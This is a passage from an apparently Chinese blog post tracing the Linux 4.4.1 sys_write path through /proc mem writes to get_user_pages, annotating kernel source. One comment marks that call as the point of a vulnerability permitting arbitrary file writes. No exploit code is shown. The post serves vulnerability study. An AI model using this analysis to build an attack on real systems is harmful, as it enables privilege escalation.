#x</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __stringify(x...)	__stringify_1(x) <span class="hljs-comment">//__stringify(a) = &quot;a&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>	<span class="hljs-comment">/* !__LINUX_STRINGIFY_H */</span></span><br><br></code></pre></td></tr></table></figure>

<p><strong>linux-4.4.1&#x2F;include&#x2F;linux&#x2F;linkage.h</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __ASSEMBLY__</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> asmlinkage_protect</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> asmlinkage_protect(n, ret, args...)	do &#123; &#125; while (0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure>

<p>根据上述内核代码，<code>SYSCALL_DEFINE3(write,unsigned int,fd,const char __user *,buf,size_t,count)</code>的宏替换过程为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(write,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>,fd,<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *,buf,<span class="hljs-type">size_t</span>,count)<br>--&gt;<br>SYSCALL_DEFINEx(<span class="hljs-number">3</span>, _write, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>,fd,<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *,buf,<span class="hljs-type">size_t</span>,count)<br>--&gt;<br>asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">sys_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span><br>__<span class="hljs-title function_">attribute__</span><span class="hljs-params">((alias(<span class="hljs-string">&quot;SyS_write&quot;</span>)))</span>; <span class="hljs-comment">//sys_write设置别名为SyS_write</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">long</span> <span class="hljs-title function_">SYSC_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span>;<br>asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">SyS_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span>;<br>asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">SyS_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span>	\ <br>&#123;								\<br>	<span class="hljs-type">long</span> ret = SYSC_write(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count);	\<br>	(<span class="hljs-type">void</span>)BUILD_BUG_ON_ZERO(!__TYPE_IS_LL(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) &amp;&amp; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) &gt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)),(<span class="hljs-type">void</span>)BUILD_BUG_ON_ZERO(!__TYPE_IS_LL(<span class="hljs-type">const</span> char__user *) &amp;&amp; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">const</span> char__user *) &gt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))<br>    (<span class="hljs-type">void</span>)BUILD_BUG_ON_ZERO(!__TYPE_IS_LL(<span class="hljs-type">size_t</span>) &amp;&amp; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) &gt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));				\<br>	<span class="hljs-keyword">do</span> &#123; &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>);	\<br>	<span class="hljs-keyword">return</span> ret;						\<br>&#125;								\<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">long</span> <span class="hljs-title function_">SYSC_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span><br></code></pre></td></tr></table></figure>

<p>因此<code>SYSCALL_DEFINE3(write,unsigned int,fd,const char __user *,buf,size_t,count)</code>编译后的结果是<code>sys_write(uunsigned int fd,const char __user * buf,size_t count)</code></p>
<h2 id="sys-write函数调用流程"><a href="#sys-write函数调用流程" class="headerlink" title="sys_write函数调用流程"></a><strong>sys_write函数调用流程</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">entry_SYSCALL_64(arch/x86/entry/entry_64.S:<span class="hljs-number">185</span>)<br>-&gt;<br>SyS_write(fs/read_write.c:<span class="hljs-number">577</span>) <br>-&gt; <br>SYSC_write(fs/read_write.c:<span class="hljs-number">585</span>) <br>-&gt; <br>vfs_write(fs/read_write.c:<span class="hljs-number">538</span>)<br>-&gt;<br>__vfs_write(fs/read_write.c:<span class="hljs-number">489</span>)<br>-&gt;<br>mem_write(fs/proc/base.c:<span class="hljs-number">908</span>)<br>-&gt;<br>mem_rw(fs/proc/base.c:<span class="hljs-number">908</span>)<br>-&gt;<br>access_remote_vm(mm/memory.c:<span class="hljs-number">3722</span>)<br>-&gt;<br>__access_remote_vm(mm/memory.c:<span class="hljs-number">3662</span>)<br>-&gt;<br>get_user_pages(mm/gup.c:<span class="hljs-number">859</span>)<br>-&gt;<br>__get_user_pages_locked(mm/gup.c:<span class="hljs-number">651</span>)<br>-&gt;<br>__get_user_pages(mm/gup.c:<span class="hljs-number">457</span>)<br>-&gt;<br>follow_page_mask(mm/gup.c+<span class="hljs-number">180</span>) and <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(mm/gup.c+<span class="hljs-number">303</span>)</span><br>-&gt;<br><span class="hljs-title function_">handle_mm_fault</span><span class="hljs-params">(mm/memory.c+<span class="hljs-number">3424</span>)</span><br>-&gt;<br>__<span class="hljs-title function_">handle_mm_fault</span><span class="hljs-params">(mm/memory.c+<span class="hljs-number">3339</span>)</span><br>-&gt;<br><span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(mm/memory.c+<span class="hljs-number">3287</span>)</span><br></code></pre></td></tr></table></figure>

<h2 id="SyS-write"><a href="#SyS-write" class="headerlink" title="SyS_write"></a><strong>SyS_write</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(write, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, buf,<br>		<span class="hljs-type">size_t</span>, count)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd); <span class="hljs-comment">//根据文件描述符获取对应的文件</span><br>	<span class="hljs-type">ssize_t</span> ret = -EBADF; <span class="hljs-comment">//#define	EBADF		 9	/* Bad file number */</span><br><br>	<span class="hljs-keyword">if</span> (f.file) &#123;<br>		<span class="hljs-type">loff_t</span> pos = file_pos_read(f.file); <span class="hljs-comment">//loff_t为long long类型,读取文件位置</span><br>		ret = vfs_write(f.file, buf, count, &amp;pos);<span class="hljs-comment">//以pos位置为起点写入文件，写入内容为buf，写入字节数为count</span><br>		<span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>)<br>			file_pos_write(f.file, pos);<br>		fdput_pos(f);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="vfs-write"><a href="#vfs-write" class="headerlink" title="vfs_write"></a><strong>vfs_write</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>	<span class="hljs-type">ssize_t</span> ret;<br><br>	<span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE)) <span class="hljs-comment">//判断是否可写</span><br>		<span class="hljs-keyword">return</span> -EBADF;<br>	<span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<span class="hljs-comment">//判断是否有写函数</span><br>		<span class="hljs-keyword">return</span> -EINVAL; <span class="hljs-comment">//#define	EINVAL		22	/* Invalid argument */</span><br>	<span class="hljs-keyword">if</span> (unlikely(!access_ok(VERIFY_READ, buf, count))) <span class="hljs-comment">//判断写入的字符是否超过了用户态的缓冲区空间，即大于0x7ffffffff000</span><br>		<span class="hljs-keyword">return</span> -EFAULT; <span class="hljs-comment">//#define	EFAULT		14	/* Bad address */</span><br><br>	ret = rw_verify_area(WRITE, file, pos, count); <span class="hljs-comment">//判断所在区域是否可写</span><br>	<span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>) &#123;<br>		count = ret;<br>		file_start_write(file);<br>		ret = __vfs_write(file, buf, count, pos);<br>		<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>			fsnotify_modify(file);<br>			add_wchar(current, ret);<br>		&#125;<br>		inc_syscw(current);<br>		file_end_write(file);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="vfs-write-1"><a href="#vfs-write-1" class="headerlink" title="__vfs_write"></a><strong>__vfs_write</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __vfs_write(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *p, <span class="hljs-type">size_t</span> count,<br>		    <span class="hljs-type">loff_t</span> *pos)<br>&#123;<br>	<span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write)<br>		<span class="hljs-keyword">return</span> file-&gt;f_op-&gt;write(file, p, count, pos); <span class="hljs-comment">//根据写入文件类型选择相应的写入函数，这里是mem_write</span><br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write_iter)<br>		<span class="hljs-keyword">return</span> new_sync_write(file, p, count, pos);<br>	<span class="hljs-keyword">else</span><br>		<span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="mem-write"><a href="#mem-write" class="headerlink" title="mem_write"></a>mem_write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf,</span><br><span class="hljs-params">			 <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> mem_rw(file, (<span class="hljs-type">char</span> __user*)buf, count, ppos, <span class="hljs-number">1</span>); <span class="hljs-comment">//mem_write实际上是对mem_rw函数的封装</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw"></a>mem_rw</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_rw</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">char</span> __user *buf,</span><br><span class="hljs-params">			<span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">int</span> write)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> file-&gt;private_data;<span class="hljs-comment">//私有数据</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = *ppos;<span class="hljs-comment">//写入地址</span><br>	<span class="hljs-type">ssize_t</span> copied;<br>	<span class="hljs-type">char</span> *page;<br><br>	<span class="hljs-keyword">if</span> (!mm)<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	page = (<span class="hljs-type">char</span> *)__get_free_page(GFP_TEMPORARY); <span class="hljs-comment">//获取空闲页</span><br>	<span class="hljs-keyword">if</span> (!page)<br>		<span class="hljs-keyword">return</span> -ENOMEM;<br><br>	copied = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))<br>		<span class="hljs-keyword">goto</span> <span class="hljs-built_in">free</span>;<br><br>	<span class="hljs-keyword">while</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-type">int</span> this_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">int</span>, count, PAGE_SIZE); <span class="hljs-comment">//取两者之间更小的值</span><br><br>		<span class="hljs-keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123; <span class="hljs-comment">//将用户态缓存区数据先拷贝的页</span><br>			copied = -EFAULT;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		this_len = access_remote_vm(mm, addr, page, this_len, write); <span class="hljs-comment">//跨进程写操作</span><br>		<span class="hljs-keyword">if</span> (!this_len) &#123;<br>			<span class="hljs-keyword">if</span> (!copied)<br>				copied = -EIO;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;<br>			copied = -EFAULT;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		buf += this_len;<br>		addr += this_len;<br>		copied += this_len;<br>		count -= this_len;<br>	&#125;<br>	*ppos = addr;<br><br>	mmput(mm);<br><span class="hljs-built_in">free</span>:<br>	free_page((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page);<br>	<span class="hljs-keyword">return</span> copied;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="access_remote_vm"></a><strong>access_remote_vm</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">access_remote_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span><br><span class="hljs-params">		<span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)</span><br>&#123;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">		mm = mm</span><br><span class="hljs-comment">		addr = addr</span><br><span class="hljs-comment">		buf = page</span><br><span class="hljs-comment">		len = this_len</span><br><span class="hljs-comment">		write = write</span><br><span class="hljs-comment">	*/</span><br>	<span class="hljs-comment">//access_remote_vm(mm, addr, page, this_len, write);</span><br>	<span class="hljs-keyword">return</span> __access_remote_vm(<span class="hljs-literal">NULL</span>, mm, addr, buf, len, write); <span class="hljs-comment">//access_remote_vm内部封装了__access_remote_vm函数</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="access-remote-vm-1"><a href="#access-remote-vm-1" class="headerlink" title="__access_remote_vm"></a>__access_remote_vm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<span class="hljs-comment">//NULL，mm为file-&gt;private_data,addr为写入的地址,buf为page,len为长度,write为写标志位</span><br>&#123;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">		tsk = NULL</span><br><span class="hljs-comment">		mm = file-&gt;private_data</span><br><span class="hljs-comment">		addr = addr</span><br><span class="hljs-comment">		buf = page</span><br><span class="hljs-comment">		len = this_len</span><br><span class="hljs-comment">		write = write</span><br><span class="hljs-comment">	*/</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span> <span class="hljs-comment">//虚拟内存的结构体</span><br>	<span class="hljs-type">void</span> *old_buf = buf; <span class="hljs-comment">//old_buf = page</span><br><br>	down_read(&amp;mm-&gt;mmap_sem);<br>	<span class="hljs-comment">/* ignore errors, just check how much was successfully transferred */</span><br>	<span class="hljs-keyword">while</span> (len) &#123;<br>		<span class="hljs-type">int</span> bytes, ret, offset;<br>		<span class="hljs-type">void</span> *maddr;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">			tsk = NULL</span><br><span class="hljs-comment">			mm = file-&gt;private_data</span><br><span class="hljs-comment">			addr = addr</span><br><span class="hljs-comment">			1</span><br><span class="hljs-comment">			write = write</span><br><span class="hljs-comment">			1</span><br><span class="hljs-comment">			page = NULL</span><br><span class="hljs-comment">			vma = NULL</span><br><span class="hljs-comment">		*/</span><br>		ret = get_user_pages(tsk, mm, addr, <span class="hljs-number">1</span>,<br>				write, <span class="hljs-number">1</span>, &amp;page, &amp;vma); <span class="hljs-comment">//获取需要写入的物理页，漏洞点存在于此，如果我们获取了文件实际的物理页，那么就可以完成任意文件写的操作</span><br>		<span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br>			<span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span><br><span class="hljs-comment">			 * we can access using slightly different code.</span><br><span class="hljs-comment">			 */</span><br>			vma = find_vma(mm, addr);<br>			<span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)<br>				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,<br>							  len, write);<br>			<span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br>				<span class="hljs-keyword">break</span>;<br>			bytes = ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			bytes = len;<br>			offset = addr &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br>			<span class="hljs-keyword">if</span> (bytes &gt; PAGE_SIZE-offset)<br>				bytes = PAGE_SIZE-offset;<br><br>			maddr = kmap(page); <span class="hljs-comment">//将高端页帧长期映射(作为持久映射)到内核地址空间中</span><br>			<span class="hljs-keyword">if</span> (write) &#123; <span class="hljs-comment">//若需要写入</span><br>				copy_to_user_page(vma, page, addr,<br>						  maddr + offset, buf, bytes);<span class="hljs-comment">//即将上一个进程的page内的内容写入刚刚获取的物理里</span><br>				set_page_dirty_lock(page);<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				copy_from_user_page(vma, page, addr,<br>						    buf, maddr + offset, bytes);<br>			&#125;<br>			kunmap(page); <span class="hljs-comment">//释放物理页</span><br>			page_cache_release(page);<br>		&#125;<br>		len -= bytes;<br>		buf += bytes;<br>		addr += bytes;<br>	&#125;<br>	up_read(&amp;mm-&gt;mmap_sem);<br><br>	<span class="hljs-keyword">return</span> buf - old_buf;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="get_user_pages"></a>get_user_pages</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">get_user_pages</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages, <span class="hljs-type">int</span> write,</span><br><span class="hljs-params">		<span class="hljs-type">int</span> force, <span class="hljs-keyword">struct</span> page **pages, <span class="hljs-keyword">struct</span> vm_area_struct **vmas)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, write, force,<br>				       pages, vmas, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>, FOLL_TOUCH);<span class="hljs-comment">//get_user_pages内部封装了__get_user_pages_locked</span><br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="get-user-pages-locked"><a href="#get-user-pages-locked" class="headerlink" title="__get_user_pages_locked"></a>__get_user_pages_locked</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 